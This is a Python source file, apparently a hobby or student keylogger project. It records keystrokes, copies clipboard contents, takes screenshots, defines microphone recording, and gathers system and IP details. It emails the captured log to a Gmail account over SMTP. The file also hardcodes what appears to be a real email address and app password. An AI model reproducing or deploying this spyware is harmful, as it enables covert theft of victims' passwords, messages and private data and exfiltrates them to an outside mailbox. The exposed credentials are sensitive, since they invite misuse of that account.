# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard

from pynput.keyboard import Key, Listener
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "shhweta9625@gmail.com"
password = "pckxrkvwppublbnd"

toaddr = "shhweta9625@gmail.com"

def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    #toaddr = "EMAIL address of the receiver"

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Log File"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload(attachment.read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()
    try:
        # Authentication
        s.login(fromaddr, password)

        # Converts the Multipart msg into a string
        text = msg.as_string()

        # sending the mail
        s.sendmail(fromaddr, toaddr, text)

    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP Authentication Error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # terminating the session
        s.quit()

send_email('log.txt', r'C:\Users\HP\PycharmProjects\Keylogger_Project\log.txt', 'shhweta9625@gmail.com')

def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(audio_information, fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:


    keys = []

    def on_press(key):
        keys.append(key)
        write_file(keys)

        try:
            print('alphanumeric key {0} pressed'.format(key.char))

        except AttributeError:
            print('special key {0} pressed'.format(key))


    def write_file(keys):
        with open('log.txt', 'w') as f:
            for key in keys:
                # removing ''
                k = str(key).replace("'", "")
                f.write(k)

                # every keystroke for readability
                f.write(' ')


    def on_release(key):
        print('{0} released'.format(key))
        if key == Key.esc:
            # Stop listener
            return False


    with Listener(on_press=on_press,
                  on_release=on_release) as listener:
        listener.join()
